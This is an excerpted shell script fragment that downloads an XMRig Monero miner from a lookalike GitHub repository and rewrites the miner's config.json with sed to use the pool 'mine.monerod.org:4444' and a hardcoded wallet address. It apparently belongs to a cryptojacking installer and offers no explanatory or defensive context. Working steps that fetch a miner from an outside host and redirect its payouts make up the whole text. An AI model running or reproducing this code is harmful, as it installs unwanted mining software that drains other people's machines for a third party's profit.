...
if ! curl -L --progress-bar "https://github.com/Monerod-Project/xmrig-md/releases/download/v6.18.1/xmrig-md-6.18.1-linux-x64.tar.gz" -o ./xmrig.tar.gz; then
  echo "ERROR: Can't download https://github.com/Monerod-Project/xmrig-md/releases/download/v6.18.1/xmrig-md-6.18.1-linux-x64.tar.gz file to ./xmrig.tar.gz"
  exit 1
fi
...
if (test $? -ne 0); then
  ...
  if ! curl -L --progress-bar https://github.com/Monerod-Project/xmrig-md/releases/download/v6.18.1/xmrig-md-6.18.1-linux-x64.tar.gz -o /tmp/xmrig.tar.gz; then
...
sed -i 's/"url": *"[^"]*",/"url": "mine.monerod.org:4444",/' $HOME/moneroocean/config.json
sed -i 's/"user": *"[^"]*",/"user": "4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu",/' $HOME/moneroocean/config.json
